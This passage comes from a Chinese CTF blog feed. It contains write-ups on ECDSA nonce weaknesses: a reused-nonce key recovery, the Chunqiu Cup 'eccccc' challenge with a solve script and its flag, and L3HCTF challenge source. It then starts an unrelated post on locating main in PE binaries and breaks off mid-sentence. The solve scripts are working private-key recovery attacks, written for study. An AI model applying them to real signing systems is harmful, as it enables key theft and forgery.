ecdsa(k,G,d,h2,O) <span class="comment"># k的复用</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;(r1,s1) = <span class="subst">&#123;sig1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;(r2,s2) = <span class="subst">&#123;sig2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment">#print(f&quot;flag=flag&#123;&#123;&#123;str(d)&#125;&#125;&#125;&quot;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">(r1,s1) = (40006709387573641419946125303569413158469101955768758583457507808179101337206, 1585768849918578394723965791955160503009311951479720516547647283934983942200)</span></span><br><span class="line"><span class="string">(r2,s2) = (40006709387573641419946125303569413158469101955768758583457507808179101337206, 85267507776229139224293234455627206003745480460349166116613720730622564486718)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><ul><li>对随机数k的复用推导就像上面那样，这里给出exp：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">p = <span class="number">104013039882501274693449938443150870046676177290878392003647959897761590749237</span></span><br><span class="line">a = <span class="number">10</span></span><br><span class="line">b = <span class="number">55</span></span><br><span class="line">E = EllipticCurve(GF(p),[a,b]) <span class="comment"># 创建一个椭圆曲线</span></span><br><span class="line">O = E.order()                  <span class="comment"># 计算该椭圆曲线的阶</span></span><br><span class="line">G = E.gen(<span class="number">0</span>)                   <span class="comment"># 获取该椭圆曲线的一个生成元</span></span><br><span class="line">d = random.randint(<span class="number">1</span>,O-<span class="number">1</span>)      <span class="comment"># 生成一个私钥</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">h</span>(<span class="params">message</span>):                <span class="comment"># 计算消息的哈希值</span></span><br><span class="line">    t = sha256(message.encode(<span class="string">&#x27;utf-8&#x27;</span>)).digest()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(t,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">(r1,s1) = (<span class="number">40006709387573641419946125303569413158469101955768758583457507808179101337206</span>, <span class="number">1585768849918578394723965791955160503009311951479720516547647283934983942200</span>)</span><br><span class="line">(r2,s2) = (<span class="number">40006709387573641419946125303569413158469101955768758583457507808179101337206</span>, <span class="number">85267507776229139224293234455627206003745480460349166116613720730622564486718</span>)</span><br><span class="line">message = [<span class="string">&quot;Hello_world&quot;</span>,<span class="string">&quot;this_is_a_meesage&quot;</span>]</span><br><span class="line">s1_s2 = s1 - s2 </span><br><span class="line">h1 = h(message[<span class="number">0</span>])</span><br><span class="line">h2 = h(message[<span class="number">1</span>])</span><br><span class="line">h1_h2 = h1-h2</span><br><span class="line">s1_s2_ = inverse_mod(s1_s2,O)</span><br><span class="line">k = h1_h2 * s1_s2_ % O</span><br><span class="line">r1_ = inverse_mod(r1,O)</span><br><span class="line">d = (s1*k - h1)*r1_ % O</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;flag&#123;&#123;<span class="subst">&#123;d&#125;</span>&#125;&#125;&quot;</span>)</span><br><span class="line"><span class="comment"># flag&#123;39293969871044977010378459455218809487719269197611508380642557837535793765188&#125;</span></span><br></pre></td></tr></table></figure><h1 id="题型2随机数k1与k2有关系">题型2—随机数k1与k2有关系</h1><h2 id="题型2综述">题型2综述</h2><ul><li>对于这种题型，其实主要考察的重点其实并不是<code>ECDSA</code>这个数字签名的过程，而是伪随机数生成器了。这个就需要对一些伪随机数生成的机制有一定的了解。</li><li>简单一点的伪随机数生成考点就是<code>LCG</code>的基础题型了，难度上来就变种的<code>LCG</code>或者其他的伪随机数生成器了。主要还是积累伪随机数生成器的相关算法和对应的破解方法吧。</li></ul><h2 id="题型2例题">题型2例题</h2><h1 id="题型3结合其他加密方式">题型3—结合其他加密方式</h1><h1 id="刷题">刷题</h1><h2 id="题目12025年春秋杯夏季赛_eccccc">题目1—2025年春秋杯夏季赛_eccccc</h2><ul><li>题目附件如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&#x27;flag&#123;&#x27;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ECDSA</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, E=<span class="literal">None</span>, G=<span class="literal">None</span>, n=<span class="literal">None</span></span>):</span><br><span class="line">        p = <span class="number">115792089237316195423570985008687907853269984665640564039457584007908834671663</span> <span class="comment"># 定义模数</span></span><br><span class="line">        a = <span class="number">0</span>; b = <span class="number">7</span></span><br><span class="line">        self.E = E <span class="keyword">if</span> E <span class="keyword">else</span> EllipticCurve(GF(p), [a, b]) <span class="comment"># 定义椭圆曲线y^2 = x^3 + 7 mod p</span></span><br><span class="line">        self.G = G <span class="keyword">if</span> G <span class="keyword">else</span> self.E.gen(<span class="number">0</span>) <span class="comment"># 获得椭圆曲线的基点</span></span><br><span class="line">        self.n = n <span class="keyword">if</span> n <span class="keyword">else</span> self.E.order() <span class="comment"># 获得椭圆曲线的阶</span></span><br><span class="line">        self.d = randint(<span class="number">1</span>, self.n - <span class="number">1</span>)    <span class="comment"># 随机选取一个数d</span></span><br><span class="line">        self.Q = self.d * self.G           <span class="comment"># 计算 d*G 椭圆曲线点运算</span></span><br><span class="line">        self.k = randint(<span class="number">1</span>, self.n - <span class="number">1</span>) % self.n <span class="comment"># 计算k = 随机数 % n (即椭圆曲线的阶)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">self, m:<span class="built_in">bytes</span></span>): <span class="comment"># 签名操作</span></span><br><span class="line">        self.k = (<span class="number">7</span> * self.k ** <span class="number">2</span> + <span class="number">3</span> * self.k + <span class="number">11</span>) % self.n  <span class="comment"># 另 k = (7*k^2 + 3*k +11 ) % n</span></span><br><span class="line">        R = self.k * self.G                                    <span class="comment"># R = k*G</span></span><br><span class="line">        r = ZZ(R.x()) % self.n                                 <span class="comment"># r = R_x % n 取点R的橫坐标%n</span></span><br><span class="line">        h = <span class="built_in">int</span>.from_bytes(sha256(m).digest(), <span class="string">&#x27;big&#x27;</span>)          <span class="comment"># h = 消息的哈希值</span></span><br><span class="line">        s = self.k**(-<span class="number">1</span>) * (h + self.d * r) % self.n           <span class="comment"># 签名结果: s = k^(-1) * (h + d*r) % n</span></span><br><span class="line">        <span class="keyword">return</span> (r, s)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">self, m:<span class="built_in">bytes</span>, r:<span class="built_in">int</span>, s:<span class="built_in">int</span></span>):  <span class="comment"># 验证过程</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">0</span> &lt; r &lt; self.n <span class="keyword">and</span> <span class="number">0</span> &lt; s &lt; self.n): <span class="comment"># 判断 0 &lt; r,s &lt; n and</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        w = <span class="built_in">pow</span>(s, -<span class="number">1</span>, self.n)          <span class="comment"># 计算 w = s^(-1) mod n</span></span><br><span class="line">        h = <span class="built_in">int</span>.from_bytes(sha256(m).digest(), <span class="string">&#x27;big&#x27;</span>) <span class="comment"># 计算消息的哈希值</span></span><br><span class="line">        u1 = (h * w) % self.n           <span class="comment"># 计算u1 = (h*w) %n</span></span><br><span class="line">        u2 = (r * w) % self.n           <span class="comment"># 计算u2 = (r*w) %n</span></span><br><span class="line">        R = u1 * self.G + u2 * self.Q   <span class="comment"># 计算点R = u1*G + u2*Q</span></span><br><span class="line">        <span class="keyword">return</span> ZZ(R.x()) % self.n == r  <span class="comment"># 验证R_x == r</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = ECDSA()</span><br><span class="line"><span class="built_in">print</span>(AES.new(key=sha256(<span class="built_in">str</span>(e.d).encode()).digest(), mode=AES.MODE_ECB).encrypt(pad(flag, <span class="number">16</span>))) <span class="comment"># 用随机数d作为密钥将flag进行加密,输出密文</span></span><br><span class="line"><span class="built_in">print</span>(e.sign(<span class="string">b&#x27;32748923ur8934u893ygf893h34t3453453&#x27;</span>))   <span class="comment"># 使用e对该消息进行签名</span></span><br><span class="line"><span class="built_in">print</span>(e.sign(<span class="string">b&#x27;ehfw9h8r039u82678ifjewf9024r2323423&#x27;</span>))   <span class="comment"># 使用e对该消息进行签名</span></span><br><span class="line"><span class="comment"># 对下一次签名的随机数k2与前一次签名的随机数k1满足一个二次模的关系</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xa7\x13\xd5j\x10*\xc9\x04\xda\x8b\xaaf\xde\xae\xdc\xdb\xb7T\xcd\x8b\xc9K\xf4\xb4^p\x8da\x1bS\xef\x92\xaf\x03\xe9\xc2\x0c\x8c\x83\x83\xf9\xc6\xc7\t\xf9\x9cp\x9d&#x27;</span></span><br><span class="line"><span class="string">(18507930132802310344248699822628576170242868593944128167302942018134209256936, 23965013559564325260453725916491832279556345092147805659950905735422363429946)</span></span><br><span class="line"><span class="string">(61645219796227967861807301237829197706412124807702206247291322591426944615554, 84283844402102709520391794221564573160907887711307574424747605446691209453247)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>exp如下，具体过程这里就不说明了，放在<code>wp</code>那边说明：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ECCCCC</span></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line">p = <span class="number">115792089237316195423570985008687907853269984665640564039457584007908834671663</span> <span class="comment"># 定义模数</span></span><br><span class="line">a = <span class="number">0</span> </span><br><span class="line">b = <span class="number">7</span></span><br><span class="line">e = EllipticCurve(GF(p),[a,b])</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line">G = e.gen(<span class="number">0</span>)</span><br><span class="line">n = e.order()</span><br><span class="line">c = <span class="string">b&#x27;\xa7\x13\xd5j\x10*\xc9\x04\xda\x8b\xaaf\xde\xae\xdc\xdb\xb7T\xcd\x8b\xc9K\xf4\xb4^p\x8da\x1bS\xef\x92\xaf\x03\xe9\xc2\x0c\x8c\x83\x83\xf9\xc6\xc7\t\xf9\x9cp\x9d&#x27;</span></span><br><span class="line">m1 = <span class="string">b&#x27;32748923ur8934u893ygf893h34t3453453&#x27;</span></span><br><span class="line">m2 = <span class="string">b&#x27;ehfw9h8r039u82678ifjewf9024r2323423&#x27;</span></span><br><span class="line">h1 = <span class="built_in">int</span>.from_bytes(sha256(m1).digest(), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">h2 = <span class="built_in">int</span>.from_bytes(sha256(m2).digest(), <span class="string">&#x27;big&#x27;</span>)   </span><br><span class="line">r1,s1 = (<span class="number">18507930132802310344248699822628576170242868593944128167302942018134209256936</span>, <span class="number">23965013559564325260453725916491832279556345092147805659950905735422363429946</span>)</span><br><span class="line">r2,s2 = (<span class="number">61645219796227967861807301237829197706412124807702206247291322591426944615554</span>, <span class="number">84283844402102709520391794221564573160907887711307574424747605446691209453247</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;基点G=&quot;</span>,G)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;阶n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(r1,r2)</span><br><span class="line"><span class="built_in">print</span>(s1,s2)</span><br><span class="line"><span class="built_in">print</span>(h1,h2)</span><br><span class="line">r1_ = inverse_mod(r1,n)</span><br><span class="line">r2_ = inverse_mod(r2,n)</span><br><span class="line">x = h1*r1_ - h2*r2_ % n</span><br><span class="line">y1 = s1*r1_ </span><br><span class="line">y2 = s2*r2_</span><br><span class="line">k = var(<span class="string">&#x27;k&#x27;</span>)</span><br><span class="line">P = PolynomialRing(Zmod(n), <span class="string">&#x27;k&#x27;</span>)</span><br><span class="line">k = P.gen()</span><br><span class="line">f = y1*k - y2*(<span class="number">7</span>*k^<span class="number">2</span> + <span class="number">3</span>*k + <span class="number">11</span>) - x </span><br><span class="line">roots = f.roots() <span class="comment"># 在mod n 下求一个关于未知数k的二次剩余,得到俩个解其中一个解就是key</span></span><br><span class="line"><span class="built_in">print</span>(roots)</span><br><span class="line">k1 = roots[<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">d = (s1*k1-h1)*r1_ % n</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="built_in">print</span>(AES.new(key=sha256(<span class="built_in">str</span>(d).encode()).digest(), mode=AES.MODE_ECB).decrypt(c))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;14537d3b-2567-4f1a-a011-2df9635dad20&#125;\x06\x06\x06\x06\x06\x06&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="题目2l3hctf_ecdsa">题目2—L3HCTF_ECDSA</h2><ul><li>题目附件如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> ecdsa <span class="keyword">import</span> NIST256p, SigningKey</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FlawedNonceGenerator</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, n</span>):</span><br><span class="line">        self.n = n</span><br><span class="line">        self.a = random.randrange(<span class="number">1</span>, n)</span><br><span class="line">        self.b = random.randrange(<span class="number">1</span>, n)</span><br><span class="line">        self.c = random.randrange(<span class="number">1</span>, n)</span><br><span class="line">        self.last_k = random.randrange(<span class="number">1</span>, n)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_nonce</span>(<span class="params">self</span>):</span><br><span class="line">        current_k = self.last_k</span><br><span class="line">        next_k = (self.a * current_k**<span class="number">2</span> + self.b * current_k + self.c) % self.n</span><br><span class="line">        self.last_k = next_k</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> current_k</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">curve = NIST256p</span><br><span class="line">n = curve.order</span><br><span class="line">G = curve.generator</span><br><span class="line"><span class="comment">#print(curve.curve)</span></span><br><span class="line"><span class="built_in">print</span>(G.x())</span><br><span class="line"><span class="built_in">print</span>(G.y())</span><br><span class="line"><span class="comment">#print(n)</span></span><br><span class="line">private_key = SigningKey.from_secret_exponent(random.randrange(<span class="number">1</span>, n), curve=curve)</span><br><span class="line">d = private_key.privkey.secret_multiplier</span><br><span class="line">public_key = private_key.get_verifying_key()</span><br><span class="line"></span><br><span class="line">messages = [</span><br><span class="line">    <span class="string">b&quot;Hello player, welcome to L3HCTF 2025!&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;This is a crypto challenge, as you can probably tell.&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;It&#x27;s about ECDSA, a very... robust algorithm.&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;I&#x27;m sure there are no implementation flaws whatsoever.&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;Anyway, here are your signatures. Good luck!&quot;</span>,</span><br><span class="line">    <span class="string">f&quot;Oh, and the flag is L3HCTF&#123;&#123;<span class="subst">&#123;d&#125;</span>&#125;&#125;. Don&#x27;t tell anyone!&quot;</span>.encode(),</span><br><span class="line">]</span><br><span class="line">nonce_generator = FlawedNonceGenerator(n)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;signatures.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    k = nonce_generator.generate_nonce()</span><br><span class="line">    message = messages[i]</span><br><span class="line">    h = <span class="built_in">int</span>.from_bytes(hashlib.sha256(message).digest(), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    R = k * curve.generator <span class="comment"># 计算R</span></span><br><span class="line">    r = R.x() % n <span class="comment"># 取Rx % n 为r</span></span><br><span class="line">    s_inv = <span class="built_in">pow</span>(k, -<span class="number">1</span>, n) <span class="comment"># k^(-1) mod n</span></span><br><span class="line">    s = (s_inv * (h + d * r)) % n <span class="comment">#s = k^(-1) * (h+d*r)</span></span><br><span class="line">    <span class="comment"># ki = a*k_i-1 **2 + b*k_i-1 + c % n</span></span><br><span class="line">    f.write(<span class="string">f&quot;h: <span class="subst">&#123;h&#125;</span>, r: <span class="subst">&#123;r&#125;</span>, s: <span class="subst">&#123;s&#125;</span>\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Oh, and the flag is L3HCTF&#123;&#123;<span class="subst">&#123;d&#125;</span>&#125;&#125;. Don&#x27;t tell anyone!&quot;</span>.encode())</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">前言：睡不着，感觉最近学密码有点上瘾了....</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="CRYPTO" scheme="http://iyheart.github.io/categories/CTF/CRYPTO/"/>
    
    <category term="椭圆曲线" scheme="http://iyheart.github.io/categories/CTF/CRYPTO/%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF/"/>
    
    
  </entry>
  
  <entry>
    <title>PE逆向定位main函数</title>
    <link href="http://iyheart.github.io/2025/08/10/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E9%80%86%E5%90%91%E5%AE%9A%E4%BD%8Dmain%E5%87%BD%E6%95%B0/"/>
    <id>http://iyheart.github.io/2025/08/10/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E9%80%86%E5%90%91%E5%AE%9A%E4%BD%8Dmain%E5%87%BD%E6%95%B0/</id>
    <published>2025-08-10T15:37:33.000Z</published>
    <updated>2025-08-13T02:57:04.893Z</updated>
    
    <content type="html"><![CDATA[<ul><li>一般而言，逆向一般分为静态分析和动态调试，现在先来说说静态分析。</li><li>参考：逆向工程核心原理第二章</li><li>[[原创]<a href="http://xn--Main----9b4kz3c78lcby87bvochsja8071abubl69c9a719sqz9bfc3acuklz3kpcdqa5478b%7C%E5%AE%89%E5%85%A8%E6%8B%9B%E8%81%98%7Ckanxue.com">逆向技术之寻找Main入口点-软件逆向-看雪-安全社区|安全招聘|kanxue.com</a>](<a href="https://bbs.kanxue.com/thread-224500.htm">https://bbs.kanxue.com/thread-224500.htm</a>)</li><li><a href="https://www.bilibili.com/video/BV1UY4y1r7bA?vd_source=bbdaef564df94fc8991902ba22c6761b">逆向分析-快速定位main函数</a></li></ul><h1 id="查看程序信息">查看程序信息</h1><ul><li>对于静态分析而言，拿到一个程序，并不要着急去使用<code>IDA pro</code>将这个可执行文件或者<code>dll</code>文件逆向出来。而是先要收集程序的一些相关的信息，一般而言要收集的程序信息有如下：<ul><li><strong>查看程序的架构</strong>，这个程序是在什么架构下的，不同架构下的程序其二进制指令是不同的即对于的汇编指令是不同的。例如：<code>x86</code>架构、<code>x86_64</code>架构、<code>mips</code>架构、<code>arm</code>架构等</li><li><strong>查看程序的文件结构</strong>，对于<code>Windows</code>系统、<code>Linux</code>系统、<code>MAC</code>系统，其对应的可执行文件的格式都不一样的，如果是<code>windows</code>系统的可执行文件那就不能在其他系统上直接运行。如果在动态调试的时候就需要选择对应的系统了。</li><li><strong>查看程序的编译环境</strong>，对于相同的代码来说，不同编译器或者编译环境编译成的可执行文件，在<code>main</code>函数执行前以及在<code>main</code>函数结束后所执行的东西是不同的。（这个文章后面会详细说明）</li><li><strong>查看程序的壳</strong>，有些程序并不想那么轻易的被反汇编，反编译，这个时候程序就会被加一个壳，这样在对程序进行逆向分析的时候就只能逆向出来程序的壳。而不能逆向出程序的正确代码。而<strong>壳</strong>这个称呼其实就是有保护程序的意思和自然界一些壳的功能非常相似。</li><li><strong>查看程序的动态链接库</strong>，一般而言如果不是静态编译的程序都会有一个动态链接库，而在逆向的目标程序中会保存着动态链接库的信息，已经一些用到的<code>函数接口</code>。从而使得我们在逆向的时候能查找资料或者能很快的反应过来这个函数的作用和功能。</li><li><strong>查看程序编写的语言</strong>，在逆向的时候目标程序不都是<code>C</code>语言编写的，可能还有<code>rust</code>、<code>C++</code>、<code>golang</code>以及一些比较古老和小众的语言。获取程序是使用哪种语言编写的这有助于我们了解到该程序会使用哪些标准库，以及一些语言特性。</li></ul></li><li>上面简单解释了一下收集程序信息的一些作用，接下来介绍一下怎么收集、使用什么工具收集。这里选用的工具是<code>die</code>，<code>die</code>的全称为<code>Detect It Easy</code>，它是一个开源的可执行文件分析工具，用来检测上面所说的程序信息。它的下载方式在这里：<a href="https://github.com/horsicq/Detect-It-Easy">horsicq/Detect-It-Easy：用于确定 Windows、Linux 和 MacOS 文件类型的程序。</a></li><li>这里做一个示范，随便找一个<code>.exe</code>的可执行文件，在拿到一个<code>.exe</code>可执行文件时，不要先急着使用<code>IDA</code>反汇编它，而是先打开<code>DIE</code>。</li></ul><p><img src="/2025/08/10/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E9%80%86%E5%90%91%E5%AE%9A%E4%BD%8Dmain%E5%87%BD%E6%95%B0/image-20250811134310354.png" alt="image-20250811134310354"></p><ul><li>这样在没有开启高级选项其信息是这样的</li></ul><p><img src="/2025/08/10/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E9%80%86%E5%90%91%E5%AE%9A%E4%BD%8Dmain%E5%87%BD%E6%95%B0/image-20250811134427490.png" alt="image-20250811134427490"></p><ul><li>在开启高级选项后会出现一大串东西，但是其实这一大串东西目前不知道有没有用。但是下图画红框的地方是需要注意的：它标识了<code>程序基地址</code>以及<code>程序入口点</code>，对于程序入口点（<strong>EnteryPoint</strong>）并不是<code>main</code>函数，这里放后面会详细说明，这里先知道有<code>EnteryPoint</code>这个东西</li><li>在下图中其实我们就能收集到上面所说的层序相关信息，有助于我们逆向分析程序。</li></ul><p><img src="/2025/08/10/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E9%80%86%E5%90%91%E5%AE%9A%E4%BD%8Dmain%E5%87%BD%E6%95%B0/image-20250811134550977.png" alt="image-20250811134550977"></p><h1 id="程序入口点entrypoint">程序入口点(EntryPoint)</h1><ul><li>在学<code>PE</code>文件结构的时候在<code>NT选项头</code>的这个结构体即<code>_IMAGE_OPTIONAL_HEADER</code>这个结构体中，会发现有这么一个成员，这个成员其实就是<code>EntryPoint</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span>&#123;</span></span><br><span class="line">    .....</span><br><span class="line">    DWORD AddressOfEntryPoint;<span class="comment">// 程序入口点地址,简称EP(当前入口点)。OEP(原始入口点),在加壳的时候这么称呼</span></span><br><span class="line">....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>如果没学过<code>PE</code>文件格式其实也不大，这里具体介绍一下<code>EntryPoint</code>这个概念：</li></ul><blockquote><p>EP(EntryPoint)入口点：</p><p>EP是Windows可执行文件的代码入口点，是执行应用程序时最先执行的代码的起始位置，它依赖于CPU。</p><p>注解：从EP的概念中其实就可以知道，我们点击一个<code>exe</code>文件，它就是从这个入口点保存的地址开始运行的，即<code>EIP、RIP</code>一开始的值为<code>EP</code></p></blockquote><ul><li>在学习<code>C</code>语言的时候，我们写的代码都是从<code>main</code>函数开始执行的，但是程序并不是一开始就执行<code>main</code>函数，而是从<code>EP</code>开始执行。</li></ul><h1 id="定位main函数">定位main函数</h1><ul><li>在收集完信息后，如果有壳就脱壳，没壳就可以直接使用<code>IDA</code>进行逆向分析了。如果有做过几题逆向题就会发现，逆向题一开始都是先去寻找<code>main</code>函数，找到<code>main</code>函数后才开始对程序进行逆向分析。其实我们编写一个程序也是从<code>main</code>函数开始。</li><li>但是在逆向分析中有的时候<code>main</code>函数可并不是那么好找的。接下来就使用一个例子来说明为什么有的时候<code>main</code>函数不好找</li></ul><h2 id="例子">例子</h2><ul><li>使用<code>vs2022</code>编写如下程序，编译后找到对应的可执行文件</li></ul><p><img src="/2025/08/10/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E9%80%86%E5%90%91%E5%AE%9A%E4%BD%8Dmain%E5%87%BD%E6%95%B0/image-20250811140349517.png" alt="image-20250811140349517"></p><ul><li>下面是对应的可执行文件，在这里除了有<code>Realme.exe</code>文件外，其实还有<code>Realme.pdb</code>文件，这个<code>.pdb</code>文件是什么呢？<code>pdb</code>的全称其实是<code>Program 